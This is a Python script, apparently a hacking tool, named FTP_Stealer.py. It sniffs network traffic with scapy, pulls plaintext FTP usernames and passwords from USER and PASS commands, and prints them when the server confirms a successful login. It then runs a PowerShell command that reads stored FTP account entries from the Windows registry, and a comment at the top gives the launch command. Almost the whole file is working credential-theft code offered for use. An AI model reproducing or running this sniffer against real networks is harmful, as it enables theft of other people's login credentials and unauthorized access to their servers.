#! /usr/bin/python
'''
Start with this command
$1 = Get-NetAdapter -physical | where status -eq 'up' | Select-Object -ExpandProperty InterfaceDescription; powershell "python FTP_Stealer.py '$1'"
'''
import sys
from logging import getLogger, ERROR
getLogger('scapy.runtime').setLevel(ERROR)
try:
	from scapy.all import *
except ImportError:
	print '[!] Error: Scapy Installation Not Found'
	sys.exit(1)

interface = sys.argv[1]

usernames = ['Error: Unlucky Timing']
passwords = ['Error: Unlucky Timing']

def check_login(pkt, username, password):
	try:
		if '230' in pkt[Raw].load:
			print '[*] Valid Credentials Found... '
			print '\t[*] ' + str(pkt[IP].dst).strip() + ' -> ' + str(pkt[IP].src).strip() + ':'
			print '\t   [*] Username: ' + username
			print '\t   [*] Password: ' + password + '\n'
			return
		else:
			return
	except Exception:
		return	

def check_for_ftp(pkt):
	if pkt.haslayer(TCP) and pkt.haslayer(Raw):
		if pkt[TCP].dport == 21 or pkt[TCP].sport == 21:
			return True
		else:
			return False
	else:
		return False

def check_pkt(pkt):
	if check_for_ftp(pkt):
		pass
	else:
		return
	data = pkt[Raw].load
	if 'USER ' in data:
		usernames.append(data.split('USER ')[1].strip())
	elif 'PASS ' in data:
		passwords.append(data.split('PASS ')[1].strip())
	else:
		check_login(pkt, usernames[-1], passwords[-1])
	return

print '[*] Sniffing Started on %s... \n' % interface

try:
	sniff(iface=interface, prn=check_pkt, store=0)
	os.system('''powershell "$ftp = \\"ftp://\\"+[uri]::EscapeDataString((reg query HKCU\\SOFTWARE\\Microsoft\\FTP\\Accounts\\).replace('HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\FTP\\Accounts\\','')).toString().replace('%20',''); explorer $ftp;"''')
except Exception:
	print '[!] Error: Failed to Initialize Sniffing'
	sys.exit(1)
print '\n[*] Sniffing Stopped'